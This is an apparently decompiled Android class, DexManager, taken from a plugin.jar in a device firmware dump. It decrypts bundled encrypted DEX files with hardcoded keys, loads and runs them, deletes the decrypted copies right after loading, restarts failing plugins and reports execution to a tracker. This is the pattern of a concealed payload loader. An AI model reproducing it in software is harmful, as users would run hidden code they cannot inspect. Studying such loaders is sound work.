package com.hs.cld.da.dx;

import android.content.Context;
import com.hs.cld.da.model.EventTypeEnum;
import com.hs.cld.da.t.Tracker;
import com.hs.p.basic.Logger;
import com.hs.p.basic.Settings;
import com.hs.p.common.async.AsyncHandler;
import com.hs.p.common.async.Implementable;
import com.hs.p.common.utils.DigestUtils;
import com.hs.p.common.utils.LOG;
import com.hs.p.common.utils.TextUtils;
import com.hs.p.dx.DIR;
import com.hs.p.dx.DexCipher;
import com.hs.p.dx.DexUtils;
import com.hs.p.dx.FileUtils;
import com.hs.p.dx.Invocation;
import dalvik.system.DexClassLoader;
import java.io.File;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import java.util.Set;

/* JADX INFO: loaded from: /Users/ruben/projector-dump/downloads/plugin.jar */
public class DexManager {
    private static final long HEALTH_CHECK_INTERVAL = 120000;
    public static final String KEY = "968a84be78d3421d5e771147dce2b766";
    private static final int MAX_CONSECUTIVE_FAILURES = 3;
    private static final int MAX_RESTART_COUNT = 5;
    public static final String PUBLIC_KEY = "MIIBtzCCASwGByqGSM44BAEwggEfAoGBAP1/U4EddRIpUt9KnC7s5Of2EbdSPO9EAMMeP4C2USZpRV1AIlH7WT2NWPq/xfW6MPbLm1Vs14E7gB00b/JmYLdrmVClpJ+f6AR7ECLCT7up1/63xhv4O1fnxqimFQ8E+4P208UewwI1VBNaFpEy9nXzrith1yrv8iIDGZ3RSAHHAhUAl2BQjxUjC8yykrmCouuEC/BYHPUCgYEA9+GghdabPd7LvKtcNrhXuXmUr7v6OuqC+VdMCz0HgmdRWVeOutRZT+ZxBxCBgLRJFnEj6EwoFhO3zwkyjMim4TwWeotUfI0o4KOuHiuzpnWRbqN/C/ohNWLx+2J6ASQ7zKTxvqhRkImog9/hWuWfBpKLZl6Ae1UlZAFMO/7PSSoDgYQAAoGAQZAl2oCfwh3WExKuiMcg3njQRZBWmDHQiEWN2vvZ4YogljxVlRccyDS+7u7aseq3+mO1qyISs548Qc50cnN39xiZaS39qvkNFbsxaPmK8edkXntGqXH874w3m7gyXNeAjYhHHG4h6jSwgDndAUjpNVQld348/SKq1E7tBvRGxBo=";
    private static final String TAG = "DexManager";
    private AsyncHandler mAsyncHandler;
    private volatile int mCurrDxCount;
    private final List<DexContext> mDexContexts;
    private AsyncHandler mHealthCheckHandler;
    private volatile boolean mHealthCheckStarted;

    private static class DexContext {
        private int mConsecutiveFailures;
        private DexClassLoader mDexClassLoader;
        private boolean mInitOK;
        private Invocation mInvocation;
        private long mLastHealthCheckTime;
        private long mLastRestartTime;
        private String mLocalDexFileUrl;
        private LocalDexInfo mLocalDexInfo;
        private String mLocalDexOutputDir;
        private int mRestartCount;

        private DexContext() {
            this.mLocalDexInfo = null;
            this.mInvocation = null;
            this.mLocalDexFileUrl = null;
            this.mLocalDexOutputDir = null;
            this.mDexClassLoader = null;
            this.mInitOK = false;
            this.mLastHealthCheckTime = 0L;
            this.mConsecutiveFailures = 0;
            this.mRestartCount = 0;
            this.mLastRestartTime = 0L;
        }

        static /* synthetic */ int access$1808(DexContext dexContext) {
            int i = dexContext.mConsecutiveFailures;
            dexContext.mConsecutiveFailures = i + 1;
            return i;
        }
    }

    private static class DexManagerHolder {
        private static final DexManager INSTANCE = new DexManager();

        private DexManagerHolder() {
        }
    }

    private static class LocalDexInfo {
        private String mRawFileMd5;
        private String mRawFileUrl;
        private String mTrackerId;
        private int mVersion;

        private LocalDexInfo() {
            this.mVersion = 0;
            this.mRawFileUrl = null;
            this.mRawFileMd5 = null;
            this.mTrackerId = null;
        }

        public String toString() {
            return "dex(" + this.mVersion + " " + this.mRawFileUrl + ")";
        }
    }

    private DexManager() {
        this.mAsyncHandler = AsyncHandler.create("DexManager.Main");
        this.mDexContexts = Collections.synchronizedList(new ArrayList());
        this.mCurrDxCount = 0;
        this.mHealthCheckHandler = AsyncHandler.create("DexManager.HealthCheck");
        this.mHealthCheckStarted = false;
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void callUninitAndUnloadDex(Context context, DexContext dexContext) {
        try {
            if (dexContext.mDexClassLoader != null) {
                LOG.i(TAG, "[" + dexContext.mLocalDexInfo + "] unload ...");
                DexUtils.callUninit(context, dexContext.mDexClassLoader, dexContext.mInvocation, dexContext.mLocalDexOutputDir);
                LOG.i(TAG, "delete dex file: " + dexContext.mLocalDexFileUrl);
                FileUtils.deleteFile(dexContext.mLocalDexFileUrl);
                LOG.i(TAG, "delete dex output dir: " + dexContext.mLocalDexOutputDir);
                FileUtils.deleteDir(dexContext.mLocalDexOutputDir);
            }
        } catch (Throwable th) {
            LOG.w(TAG, "call uninit and unload failed: " + th);
        }
    }

    private boolean checkPluginHealth(Context context, DexContext dexContext) {
        try {
            if (dexContext.mDexClassLoader == null) {
                LOG.w(TAG, "[" + dexContext.mLocalDexInfo + "] DexClassLoader is null");
                return false;
            }
            if (!dexContext.mInitOK) {
                LOG.w(TAG, "[" + dexContext.mLocalDexInfo + "] Plugin not initialized");
                return false;
            }
            if (dexContext.mInvocation != null && !TextUtils.empty(dexContext.mInvocation.mClassName)) {
                try {
                    Class<?> clsLoadClass = dexContext.mDexClassLoader.loadClass(dexContext.mInvocation.mClassName);
                    if (clsLoadClass == null) {
                        LOG.w(TAG, "[" + dexContext.mLocalDexInfo + "] Failed to load plugin class");
                        return false;
                    }
                    try {
                        Method declaredMethod = clsLoadClass.getDeclaredMethod("health", Context.class);
                        if (declaredMethod != null) {
                            Object objInvoke = declaredMethod.invoke(null, context);
                            if (objInvoke instanceof Boolean) {
                                boolean zBooleanValue = ((Boolean) objInvoke).booleanValue();
                                LOG.d(TAG, "[" + dexContext.mLocalDexInfo + "] Plugin health check: " + zBooleanValue);
                                return zBooleanValue;
                            }
                        }
                    } catch (NoSuchMethodException unused) {
                    }
                } catch (ClassNotFoundException e) {
                    LOG.w(TAG, "[" + dexContext.mLocalDexInfo + "] Plugin class not found: " + e.getMessage());
                    return false;
                }
            }
            return true;
        } catch (Throwable th) {
            LOG.w(TAG, "[" + dexContext.mLocalDexInfo + "] health check failed: " + th);
            return false;
        }
    }

    private void clearCache(Context context) {
        try {
            String localDir = getLocalDir(context, DIR.dxDxf());
            LOG.i(TAG, "delete dex dir: " + localDir);
            FileUtils.deleteDir(localDir);
        } catch (Throwable unused) {
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public Tracker createTracker(Context context, DexContext dexContext, boolean z, String str) {
        if (dexContext == null || dexContext.mLocalDexInfo == null) {
            return null;
        }
        Tracker tracker = new Tracker(context);
        tracker.setTrackerId(dexContext.mLocalDexInfo.mTrackerId).setEventType(EventTypeEnum.EXECUTED).setEventTime(System.currentTimeMillis()).setEventCode(!z ? 1 : 0).setEventMessage(str);
        return tracker;
    }

    private File decryptDexFile(Context context, DexContext dexContext, LocalDexInfo localDexInfo) throws Exception {
        File file = new File(localDexInfo.mRawFileUrl);
        dexContext.mLocalDexInfo = localDexInfo;
        dexContext.mLocalDexFileUrl = getLocalDexFileDir(context, file);
        File file2 = new File(dexContext.mLocalDexFileUrl);
        FileUtils.create(file2, true);
        try {
            dexContext.mInvocation = DexCipher.decrypt(PUBLIC_KEY, KEY, file, file2);
            return file2;
        } catch (Throwable th) {
            throw new Exception("decrypt rf(" + file + ") >> dex(" + file2 + ") failed: " + th, th);
        }
    }

    private void deleteExcludeLastThreeVersions(Context context, LocalDexInfo localDexInfo) {
        List<LocalDexInfo> listListAllLocalDexFiles = listAllLocalDexFiles(context);
        while (listListAllLocalDexFiles.size() > 3) {
            LocalDexInfo localDexInfo2 = listListAllLocalDexFiles.get(listListAllLocalDexFiles.size() - 1);
            if (!TextUtils.equals(localDexInfo2.mRawFileUrl, localDexInfo.mRawFileUrl)) {
                safeDelete(null, localDexInfo2);
            }
            listListAllLocalDexFiles.remove(listListAllLocalDexFiles.size() - 1);
        }
    }

    private synchronized void destroy0(Context context, boolean z) {
        if (!this.mDexContexts.isEmpty()) {
            LOG.i(TAG, "destroying " + this.mDexContexts.size() + " dex contexts...");
            Iterator it = new ArrayList(this.mDexContexts).iterator();
            while (it.hasNext()) {
                callUninitAndUnloadDex(context, (DexContext) it.next());
            }
            this.mDexContexts.clear();
        }
        if (z) {
            DIR.clearAll(context);
        }
    }

    public static DexManager get() {
        return DexManagerHolder.INSTANCE;
    }

    private String getLocalDexFileDir(Context context, File file) {
        String str = getLocalDir(context, DIR.dxDxf()) + File.separator + file.getName() + DIR.SUFFIX_DXF;
        FileUtils.createDir(new File(str));
        return str;
    }

    private static String getLocalDir(Context context, String str) {
        String str2 = DIR.root(context) + File.separator + str;
        FileUtils.createDir(new File(str2));
        return str2;
    }

    public static File getLocalRawFilesDir(Context context) {
        return new File(getLocalDir(context, DIR.dxRf()));
    }

    private String getRawFileTrackerId(LocalDexInfo localDexInfo) {
        try {
            String name = new File(localDexInfo.mRawFileUrl).getName();
            if (name.contains(DIR.PREFIX_RF)) {
                name = name.replace(DIR.PREFIX_RF, "");
            }
            return name.contains(".") ? name.substring(0, name.lastIndexOf(".")) : name;
        } catch (Exception unused) {
            return localDexInfo.mRawFileMd5;
        }
    }

    private List<LocalDexInfo> listAllLocalDexFiles(Context context) {
        int version;
        ArrayList arrayList = new ArrayList();
        File localRawFilesDir = getLocalRawFilesDir(context);
        String[] list = localRawFilesDir.list();
        if (list != null) {
            for (String str : list) {
                File file = new File(localRawFilesDir, str);
                if (file.isFile() && file.getName().endsWith(DIR.SUFFIX_RF) && (version = DexCipher.parseVersion(PUBLIC_KEY, file)) > 0) {
                    LocalDexInfo localDexInfo = new LocalDexInfo();
                    localDexInfo.mVersion = version;
                    localDexInfo.mRawFileUrl = file.getAbsolutePath();
                    localDexInfo.mRawFileMd5 = DigestUtils.md5AsString(file);
                    localDexInfo.mTrackerId = getRawFileTrackerId(localDexInfo);
                    arrayList.add(localDexInfo);
                }
            }
        }
        Collections.sort(arrayList, new Comparator<LocalDexInfo>() { // from class: com.hs.cld.da.dx.DexManager.1
            @Override // java.util.Comparator
            public int compare(LocalDexInfo localDexInfo2, LocalDexInfo localDexInfo3) {
                return localDexInfo3.mVersion - localDexInfo2.mVersion;
            }
        });
        return arrayList;
    }

    /* JADX INFO: Access modifiers changed from: private */
    public DexContext loadDexAndCallInit(Context context, LocalDexInfo localDexInfo) throws Exception {
        DexContext dexContext = new DexContext();
        File fileDecryptDexFile = decryptDexFile(context, dexContext, localDexInfo);
        if (fileDecryptDexFile.exists()) {
            fileDecryptDexFile.setReadOnly();
        }
        dexContext.mLocalDexOutputDir = DexUtils.getLocalDexOutputDir(fileDecryptDexFile);
        dexContext.mDexClassLoader = DexUtils.getDexClassLoader(context, dexContext.mLocalDexFileUrl, dexContext.mLocalDexOutputDir);
        DexUtils.callInit(context, dexContext.mDexClassLoader, dexContext.mInvocation, dexContext.mLocalDexOutputDir);
        dexContext.mInitOK = true;
        LOG.i(TAG, "delete dex file: " + dexContext.mLocalDexFileUrl);
        FileUtils.deleteFile(dexContext.mLocalDexFileUrl);
        return dexContext;
    }

    private synchronized void loadInternal(Context context) {
        clearCache(context);
        List<LocalDexInfo> listListAllLocalDexFiles = listAllLocalDexFiles(context);
        LOG.i(TAG, "find: " + listListAllLocalDexFiles);
        this.mCurrDxCount = listListAllLocalDexFiles.size();
        for (LocalDexInfo localDexInfo : listListAllLocalDexFiles) {
            DexContext dexContextLoadDexAndCallInit = null;
            try {
                LOG.i(TAG, "[" + localDexInfo + "] load start ...");
                dexContextLoadDexAndCallInit = loadDexAndCallInit(context, localDexInfo);
                this.mDexContexts.add(dexContextLoadDexAndCallInit);
                submitTrackerRunning(context, dexContextLoadDexAndCallInit);
                submitTrackerOK(context, dexContextLoadDexAndCallInit);
            } catch (Throwable th) {
                LOG.w(TAG, "[" + localDexInfo + "] load failed: " + th, th);
                submitTrackerError(context, dexContextLoadDexAndCallInit, th);
                safeDelete(dexContextLoadDexAndCallInit, localDexInfo);
            }
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void performHealthCheck(Context context) {
        if (this.mDexContexts.isEmpty()) {
            LOG.d(TAG, "No plugins to health check");
            return;
        }
        LOG.d(TAG, "Performing health check on " + this.mDexContexts.size() + " plugins");
        for (DexContext dexContext : new ArrayList(this.mDexContexts)) {
            if (dexContext != null && dexContext.mInitOK) {
                try {
                    boolean zCheckPluginHealth = checkPluginHealth(context, dexContext);
                    dexContext.mLastHealthCheckTime = System.currentTimeMillis();
                    if (!zCheckPluginHealth) {
                        DexContext.access$1808(dexContext);
                        LOG.w(TAG, "[" + dexContext.mLocalDexInfo + "] health check failed, consecutive failures: " + dexContext.mConsecutiveFailures);
                        if (dexContext.mConsecutiveFailures >= 3) {
                            if (dexContext.mRestartCount < 5) {
                                LOG.w(TAG, "[" + dexContext.mLocalDexInfo + "] restarting plugin (attempt " + (dexContext.mRestartCount + 1) + "/5)");
                                restartPlugin(context, dexContext);
                            } else {
                                LOG.e(TAG, "[" + dexContext.mLocalDexInfo + "] max restart count reached, giving up");
                            }
                        }
                    } else if (dexContext.mConsecutiveFailures > 0) {
                        LOG.i(TAG, "[" + dexContext.mLocalDexInfo + "] health check recovered");
                        dexContext.mConsecutiveFailures = 0;
                    }
                } catch (Throwable th) {
                    LOG.w(TAG, "[" + dexContext.mLocalDexInfo + "] health check error: " + th, th);
                }
            }
        }
    }

    private void restartPlugin(final Context context, final DexContext dexContext) {
        this.mAsyncHandler.post(new Implementable("restartPlugin") { // from class: com.hs.cld.da.dx.DexManager.5
            @Override // com.hs.p.common.async.Implementable
            protected void implement() {
                try {
                    LOG.i(DexManager.TAG, "[" + dexContext.mLocalDexInfo + "] restarting plugin...");
                    DexManager.this.callUninitAndUnloadDex(context, dexContext);
                    Thread.sleep(1000L);
                    DexContext dexContextLoadDexAndCallInit = DexManager.this.loadDexAndCallInit(context, dexContext.mLocalDexInfo);
                    synchronized (DexManager.this.mDexContexts) {
                        int iIndexOf = DexManager.this.mDexContexts.indexOf(dexContext);
                        if (iIndexOf >= 0) {
                            DexManager.this.mDexContexts.set(iIndexOf, dexContextLoadDexAndCallInit);
                        }
                    }
                    dexContextLoadDexAndCallInit.mRestartCount = dexContext.mRestartCount + 1;
                    dexContextLoadDexAndCallInit.mLastRestartTime = System.currentTimeMillis();
                    dexContextLoadDexAndCallInit.mConsecutiveFailures = 0;
                    LOG.i(DexManager.TAG, "[" + dexContext.mLocalDexInfo + "] plugin restarted successfully");
                    DexManager.this.submitTrackerRunning(context, dexContextLoadDexAndCallInit);
                } catch (Throwable th) {
                    LOG.e(DexManager.TAG, "[" + dexContext.mLocalDexInfo + "] restart failed: " + th, th);
                }
            }
        });
    }

    private void safeDelete(DexContext dexContext, LocalDexInfo localDexInfo) {
        if (dexContext != null) {
            try {
                FileUtils.deleteFile(dexContext.mLocalDexFileUrl);
                FileUtils.deleteFile(dexContext.mLocalDexOutputDir);
            } catch (Throwable th) {
                LOG.w(TAG, "safe delete failed", th);
                return;
            }
        }
        if (localDexInfo != null) {
            FileUtils.deleteFile(localDexInfo.mRawFileUrl);
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void scheduleNextHealthCheck(final Context context) {
        if (this.mHealthCheckStarted) {
            this.mHealthCheckHandler.postDelayed(new Implementable("healthCheck") { // from class: com.hs.cld.da.dx.DexManager.4
                @Override // com.hs.p.common.async.Implementable
                protected void implement() {
                    DexManager.this.performHealthCheck(context);
                    DexManager.this.scheduleNextHealthCheck(context);
                }
            }, HEALTH_CHECK_INTERVAL);
        }
    }

    private void startHealthCheck(final Context context) {
        if (this.mHealthCheckStarted) {
            return;
        }
        this.mHealthCheckStarted = true;
        LOG.i(TAG, "Starting plugin health check monitor");
        this.mHealthCheckHandler.post(new Implementable("firstHealthCheck") { // from class: com.hs.cld.da.dx.DexManager.3
            @Override // com.hs.p.common.async.Implementable
            protected void implement() {
                DexManager.this.performHealthCheck(context);
                DexManager.this.scheduleNextHealthCheck(context);
            }
        });
    }

    private void stopHealthCheck() {
        this.mHealthCheckStarted = false;
        LOG.i(TAG, "Stopping plugin health check monitor");
    }

    private void submitTrackerError(Context context, DexContext dexContext, Throwable th) {
        Tracker trackerCreateTracker = createTracker(context, dexContext, false, th.getMessage());
        if (trackerCreateTracker != null) {
            trackerCreateTracker.submitAsync();
        }
    }

    private void submitTrackerOK(final Context context, final DexContext dexContext) {
        this.mAsyncHandler.post(new Implementable("submitTrackerOK") { // from class: com.hs.cld.da.dx.DexManager.2
            @Override // com.hs.p.common.async.Implementable
            protected void implement() {
                String lastTrackerId = Settings.getLastTrackerId(context, "");
                String str = dexContext.mLocalDexInfo.mTrackerId;
                if (TextUtils.equals(lastTrackerId, str)) {
                    LOG.d(DexManager.TAG, "[" + str + "] has submitted: ignore ...");
                    return;
                }
                Tracker trackerCreateTracker = DexManager.this.createTracker(context, dexContext, true, "OK");
                if (trackerCreateTracker != null) {
                    try {
                        trackerCreateTracker.submit();
                        Settings.putLastTrackerId(context, str);
                    } catch (Throwable th) {
                        LOG.w(DexManager.TAG, "submit tracker ok failed", th);
                    }
                }
            }
        });
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void submitTrackerRunning(Context context, DexContext dexContext) {
        Tracker trackerCreateTracker = createTracker(context, dexContext, true, "running");
        if (trackerCreateTracker != null) {
            trackerCreateTracker.setEventType(EventTypeEnum.RUNNING);
            trackerCreateTracker.submitAsync();
        }
    }

    public void destroy(Context context) {
        try {
            stopHealthCheck();
            destroy0(context, true);
        } catch (Throwable th) {
            LOG.w(TAG, "destroy failed", th);
        }
    }

    public String getDxVersion() {
        try {
            if (this.mDexContexts.isEmpty()) {
                return "";
            }
            StringBuilder sb = new StringBuilder();
            for (DexContext dexContext : new ArrayList(this.mDexContexts)) {
                if (dexContext != null && dexContext.mLocalDexInfo != null) {
                    if (sb.length() > 0) {
                        sb.append(",");
                    }
                    sb.append(dexContext.mLocalDexInfo.mVersion);
                }
            }
            return sb.toString();
        } catch (Throwable unused) {
            return "";
        }
    }

    public Set<String> getRunningPluginMd5s() {
        HashSet hashSet = new HashSet();
        try {
            if (!this.mDexContexts.isEmpty()) {
                for (DexContext dexContext : new ArrayList(this.mDexContexts)) {
                    if (dexContext != null && dexContext.mLocalDexInfo != null && dexContext.mInitOK) {
                        hashSet.add(dexContext.mLocalDexInfo.mRawFileMd5);
                    }
                }
            }
        } catch (Throwable th) {
            LOG.w(TAG, "Error getting running plugin MD5s", th);
        }
        return hashSet;
    }

    public boolean isPluginRunning(String str) {
        try {
            if (this.mDexContexts.isEmpty()) {
                return false;
            }
            for (DexContext dexContext : new ArrayList(this.mDexContexts)) {
                if (dexContext != null && dexContext.mLocalDexInfo != null && dexContext.mInitOK && TextUtils.equals(dexContext.mLocalDexInfo.mRawFileMd5, str)) {
                    return true;
                }
            }
            return false;
        } catch (Throwable th) {
            LOG.w(TAG, "Error checking plugin running status for MD5: " + str, th);
            return false;
        }
    }

    public void load(Context context) {
        if (this.mDexContexts.isEmpty()) {
            reload(context);
        } else {
            startHealthCheck(context);
        }
    }

    public void reload(Context context) {
        try {
            destroy0(context, false);
            loadInternal(context);
            startHealthCheck(context);
        } catch (Throwable th) {
            Logger.append(context, TAG, "load dx failed", th);
        }
    }
}
